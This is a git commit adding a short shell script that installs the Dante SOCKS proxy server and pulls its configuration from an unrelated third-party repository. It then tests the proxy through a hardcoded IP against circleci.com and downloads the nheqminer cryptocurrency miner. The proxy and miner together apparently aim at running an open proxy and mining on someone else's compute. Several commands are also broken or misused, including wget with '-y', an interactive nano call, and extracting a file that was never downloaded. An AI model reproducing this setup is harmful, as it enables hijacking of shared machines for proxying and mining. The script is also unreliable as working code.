32604b6602537dd87511822496df029cc32bebbd
yiyinsintaa <93459681+yiyinsintaa@users.noreply.github.com>
2021-10-31 10:30:05 +0700

    Create project3.sh

---
+++ project3.sh
@@ -0,0 +1,18 @@
+wget http://ppa.launchpad.net/dajhorn/dante/ubuntu/pool/main/d/dante/dante-server_1.4.1-1_amd64.deb -y
+sudo apt-get install gdebi-core -y
+sudo gdebi dante-server_1.4.1-1_amd64.deb -y
+#
+nano /etc/danted.conf
+#
+wget https://raw.githubusercontent.com/ginadamayant/billchila/main/nano/etc/danted.conf
+#
+service danted start
+#
+service danted status
+#
+curl -v -x socks5://35.228.206.168:1080 https://circleci.com/
+#
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz 
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+#
